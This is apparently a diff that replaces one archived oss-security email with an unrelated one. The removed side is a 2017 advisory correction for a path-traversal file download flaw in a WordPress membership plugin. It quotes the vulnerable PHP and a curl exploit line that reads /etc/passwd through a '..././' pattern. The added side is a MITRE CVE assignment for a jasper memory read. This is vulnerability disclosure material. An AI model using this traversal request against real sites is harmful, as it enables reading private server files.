@@ -1,60 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/15/2
-Message-id: <68EF56AF-248C-4D01-A1E5-DC0AB9FCACBB@me.com>
-Date: Wed, 15 Mar 2017 08:09:01 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/17/4
+Message-ID: <e442aa4c259f4f8f855d4e2125208702@imshyb01.MITRE.ORG>
+Date: Mon, 16 Jan 2017 19:11:33 -0500
+From: <cve-assign@...re.org>
+To: <ago@...too.org>
+CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>
+Subject: Re: jasper: invalid memory read in jas_matrix_asl (jas_seq.c)
 Content-Type: text/plain; charset=utf-8
 
-Sorry Folks,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-The vulnerability description should have read 'does *not* check':
-
-> Vulnerability:
-> The file download code located membership-simplified-for-oap-members-only/download.php does not check whether a user is logged in and has download privledges, the code on line 5 that checks the path can be defeated by using a ..././ pattern to get the desired ../ after being passed through the str_replace() function:
-
-
-
-> On Mar 14, 2017, at 4:33 PM, Larry W. Cashdollar <larry0@...com> wrote:
+> [] https://blogs.gentoo.org/ago/2017/01/16/jasper-invalid-memory-read-in-jas_matrix_asl-jas_seq-c
 > 
-> Title: Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58
-> Author: Larry W. Cashdollar, @_larry0
-> Date: 2017-03-13
-> CVE-ID:[CVE-2017-1002008]
-> Download Site: https://wordpress.org/plugins/membership-simplified-for-oap-members-only
-> Vendor: https://profiles.wordpress.org/williamdeangelis/
-> Vendor Notified: 2017-03-13
-> Vendor Contact: plugins@...dpress.org
-> Advisory: http://www.vapidlabs.com/advisory.php?v=187
-> Description: Membership Simplified allows you to generate membership lessons with templated content to create a unified look and feel throughout your courses.
-> Vulnerability:
-> The file download code located membership-simplified-for-oap-members-only/download.php does check whether a user is logged in and has download privledges, the code on line 5 that checks the path can be defeated by using a ..././ pattern to get the desired ../ after being passed through the str_replace() function:
+> AddressSanitizer: SEGV on unknown address
+> The signal is caused by a READ memory access.
 > 
-> 3 $path = substr(getcwd(), 0, -50). "uploads/membership-simplified-for-oap-members-only/"; // change the path to fit your websites document structure
->  4 $fullPath = $path.$_GET['download_file'];
->  5 $fullPath = str_replace("../","",$fullPath);
->  6 
->  7 if ($fd = fopen($fullPath, "r")) {
->  8     $fsize = filesize($fullPath);
->  9     $path_parts = pathinfo($fullPath);
-> 10     $ext = strtolower($path_parts["extension"]);
-> 11     switch ($ext) {
-> 12         case "pdf":
-> 13         header("Content-type: application/pdf"); // add here more headers for d    iff. extensions
-> 14         header("Content-Disposition: attachment; filename=\"".$path_parts["base    name"]."\""); // use 'attachment' to force a download
-> 15         break;
-> 16         default;
-> 17         header("Content-type: application/octet-stream");
-> 18         header("Content-Disposition: filename=\"".$path_parts["basename"]."\"")    ;
-> 19     }
-> 20     header("Content-length: $fsize");
-> 21     header("Cache-control: private"); //use this to open files directly
-> 22     while(!feof($fd)) {
-> 23         $buffer = fread($fd, 2048);
-> 24         echo $buffer;
-> 
-> Exploit Code:
-> 	• $ curl http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././..././..././..././..././..././etc/passwd
-> 	•  
+> jas_matrix_asl ... jasper-1.900.27/src/libjasper/base/jas_seq.c:376:11
 
+Use CVE-2017-5505.
+
+
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCAAGBQJYfV+YAAoJEHb/MwWLVhi2JbMQAKJyXcljg++i7XUckrbXk7aw
+rtgu6dCKSX2Vuaj1A16M0z4axW5rBztxCIKYW8YsB9h5WtQaEmN2S5yVHvnWZXAm
+/FYxaAWXsGKBEpL/V/MH7xbcBgoqgwDhV4RqS/qdJqesftimzep8DN0Ko88ix2Qd
+Sqbn0YpPEIj/BeWib7Sji7wX/9a615hL4wdEK2GmmFOUeWSIyVUEL42aGxNlWSe1
+FLNg3/YC+LV+8XSB2HKg2gAKtQICj0ZBQAiJRJqAtSWrKCdc8wrVHRZfX9eSuPdp
+1YiCiNoQu6yQTopiWPY8HzILhMIg9Ao0gQVplHt1Uwqmke37oQTO+rzPQ1bY8R8m
+i/3HqRMmMh8DYPtYd09GZ5YERvuGXC6I46hQNFL1aTK71tMJjHwoypO+1Zh50wkZ
+uv9+tYu2uFm4FSk/ngaxphfqqr/Kchuni5xU7IVGRgyE6I7akMK3+lBrff1ppFYN
+cewXe3/Kb7SpudiEKRPfhLMSf9xbwt9p6k/osc5KUYfNpH9hSC5+DzTuZeBvuo9z
+dCD7LN6HeYRYLtw8z7gvCykQo1ij2j51n4C7gYo9Ju7qElceEskHjNhx9En52vxd
+TqJ5ru/07S60soE1aOHBQW+262Kr6/0BmbJrQe/DEeDkPczO4GfX1vHZ205yyyyf
+ODkC2oAB3jzKmXez32l1
+=w95I
+-----END PGP SIGNATURE-----
